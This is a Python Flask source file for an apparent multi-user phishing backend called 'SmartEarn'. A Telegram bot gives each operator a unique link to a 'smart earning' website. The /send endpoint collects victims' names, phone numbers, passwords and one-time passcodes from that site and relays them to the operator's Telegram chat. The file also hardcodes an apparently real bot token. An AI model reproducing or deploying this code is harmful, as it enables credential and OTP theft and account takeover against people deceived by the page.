# =======================================
# SmartEarn Multi-User Bot System (Direct OTP)
# Developer: MN SIDDIK
# =======================================

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import uuid

app = Flask(__name__)
CORS(app)  # Cross-Origin enabled

BOT_TOKEN = "8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI"
BASE_URL = "https://smart-earning.netlify.app"

# Runtime memory for user UID -> chat_id mapping
USERS = {}

def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode":"Markdown"}
    requests.post(url, json=payload)

# =======================================
# Telegram webhook
# =======================================
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_telegram():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text","")
        if text == "/start":
            unique_id = str(uuid.uuid4())[:8]
            USERS[unique_id] = chat_id
            link = f"{BASE_URL}/?uid={unique_id}"
            send_message(chat_id, f"🎉 Welcome!\n\n🔗 Your unique link:\n{link}\n\nএই লিংকটি কেবল আপনার জন্য। অন্য কাউকে দেবেন না 🔒")
    return jsonify({"ok": True})

# =======================================
# Receive form submission (name, number, password, otp)
# =======================================
@app.route("/send", methods=["POST"])
def handle_form():
    data = request.get_json()
    uid = data.get("uid")
    name = data.get("name")
    number = data.get("number")
    password = data.get("password")
    otp = data.get("otp")  # frontend থেকে OTP

    if not uid or uid not in USERS:
        return jsonify({"error":"Invalid or expired UID"}), 400

    chat_id = USERS[uid]
    message = (
        f"📥 *New Submission Received!*\n\n"
        f"👤 Name: {name}\n"
        f"📱 Number: {number}\n"
        f"🔑 Password: {password}\n"
        f"🔐 OTP Entered: {otp}\n\n"
        f"🆔 UID: {uid}"
    )
    send_message(chat_id, message)
    return jsonify({"success": True})

@app.route("/", methods=["GET"])
def home():
    return "✅ SmartEarn Bot Running!"

if __name__=="__main__":
    app.run(host="0.0.0.0", port=8080)
